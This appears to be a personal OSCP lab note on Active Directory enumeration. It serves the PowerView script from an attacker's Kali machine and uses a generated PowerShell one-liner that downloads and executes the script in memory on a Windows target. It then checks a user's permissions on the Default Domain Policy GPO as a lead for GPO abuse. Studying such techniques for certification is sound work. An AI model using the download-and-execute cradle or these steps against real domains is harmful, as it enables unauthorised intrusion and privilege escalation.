```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
```

```
cd ~/Desktop/Tools/Windows && python -m http.server 80
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const apage = dv.page("Synced OSCP Notes/Guides/Copy File From Kali to Windows target");const filename = apage?.["filename"] ?? "NO FILENAME FOUND";

const command = `iex(new-object net.webclient).downloadstring('http://${KaliIP}:80/PowerView.ps1')`;

dv.paragraph("```bash\n" + command + "\n```");
```
---

```
Get-GPO -Name "Default Domain Policy"
```

![[Pasted image 20260817210620.png]]

---

```
Get-GPPermission -Guid [ID] -TargetType User -TargetName [user]
```

```
Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName anirudh
```

![[Pasted image 20260817210700.png]]

---

In this instance, this is exploitable by [[GPO Abuse]]